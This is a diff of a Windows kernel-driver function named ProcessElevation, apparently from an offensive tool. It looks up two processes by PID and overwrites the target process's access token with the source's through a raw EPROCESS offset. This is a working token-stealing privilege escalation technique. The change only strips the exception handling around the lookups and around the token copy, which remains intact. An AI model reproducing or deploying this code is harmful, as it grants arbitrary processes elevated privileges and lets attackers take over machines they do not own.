@@ -74,44 +74,28 @@ NTSTATUS ProcessElevation(ULONG srcPid, ULONG targetPid)
 	NTSTATUS status = STATUS_SUCCESS;
 	PEPROCESS pTargetProcess, pSrcProcess;
 
-	__try
+	//Getting target process
+	status = PsLookupProcessByProcessId(ULongToHandle(targetPid), &pTargetProcess);
+	if (!NT_SUCCESS(status))
 	{
-		//Getting target process
-		status = PsLookupProcessByProcessId(ULongToHandle(targetPid), &pTargetProcess);
-		if (!NT_SUCCESS(status))
-		{
-			KdPrint(("[-] Target PID PsLookup failed\n"));
-			return status;
-		}
-		KdPrint(("[+] Target EProcess address: 0x%p\n", pTargetProcess));
-
-		//Getting source process
-		status = PsLookupProcessByProcessId(ULongToHandle(srcPid), &pSrcProcess);
-		if (!NT_SUCCESS(status))
-		{
-			KdPrint(("[-] Source PID PsLookup failed\n"));
-			return status;
-		}
-		KdPrint(("[+] Source EProcess address: 0x%p\n", pSrcProcess));
+		KdPrint(("[-] Target PID PsLookup failed\n"));
+		return status;
 	}
-	__except (EXCEPTION_EXECUTE_HANDLER)
+	KdPrint(("[+] Target EProcess address: 0x%p\n", pTargetProcess));
+
+	//Getting source process
+	status = PsLookupProcessByProcessId(ULongToHandle(srcPid), &pSrcProcess);
+	if (!NT_SUCCESS(status))
 	{
-		KdPrint(("[-] Target or source PID PsLookup failed\n"));
-		return EXCEPTION_EXECUTE_HANDLER;
+		KdPrint(("[-] Source PID PsLookup failed\n"));
+		return status;
 	}
 
-	__try
-	{
-		KdPrint(("[+] Setting source token to the target token\n"));
+	KdPrint(("[+] Source EProcess address: 0x%p\n", pSrcProcess));
+	KdPrint(("[+] Setting source token to the target token\n"));
 
-		*(UINT64*)((UINT64)pTargetProcess + (UINT64)TOKEN) = *(UINT64*)(UINT64(pSrcProcess) + (UINT64)TOKEN);
-		KdPrint(("[*] Source token copied to the target!\n"));
-	}
-	__except (EXCEPTION_EXECUTE_HANDLER)
-	{
-		KdPrint(("[-] Setting target token to source token failed!\n"));
-		return EXCEPTION_EXECUTE_HANDLER;
-	}
+	*(UINT64*)((UINT64)pTargetProcess + (UINT64)TOKEN) = *(UINT64*)(UINT64(pSrcProcess) + (UINT64)TOKEN);
+	KdPrint(("[*] Source token copied to the target!\n"));
 
 	return status;
 }
